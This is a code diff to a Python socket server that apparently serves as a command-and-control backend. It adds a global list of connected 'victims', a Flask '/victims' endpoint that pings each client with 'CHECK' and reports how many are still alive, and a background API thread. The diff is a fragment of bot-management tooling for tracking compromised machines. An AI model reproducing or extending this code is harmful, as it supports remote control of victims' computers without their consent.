@@ -1,13 +1,36 @@
-from flask import Flask
-from flask_cors import CORS
+from flask import jsonify
 from utils.connection_types import Client
 import socket
 from sys import argv
 from utils import logger
 from threading import Thread
+from utils.api_types import export_app
 
-app = Flask(__name__)
-CORS(app)
+victims = list()
+
+app = export_app()
+
+@app.route('/victims')
+def get_victims():
+    global victims
+    checked = list()
+    
+    for client in victims:
+        try:
+            client.conn.send('CHECK'.encode('utf-8'))
+            checked.append(client)
+        except:
+            continue
+
+    victims = checked
+
+    return jsonify({
+        'TOTAL SIZE' : len(victims)
+    })
+
+api = Thread(target=app.run, name="API Handler 1", daemon=True)
+
+api.start()
 
 if argv[1] == '--dev':
     HOST, PORT = 'localhost', 9090
@@ -29,7 +52,9 @@ while 'LISTENING':
     client_id += 1
 
     logger.info('CONNECTED: ', addr)
+
     client = Client(conn, client_id)
+    victims.append(client)
 
     handler = Thread(target=client.loop,
                      name=f"CLIENT {client_id} HANDLER")
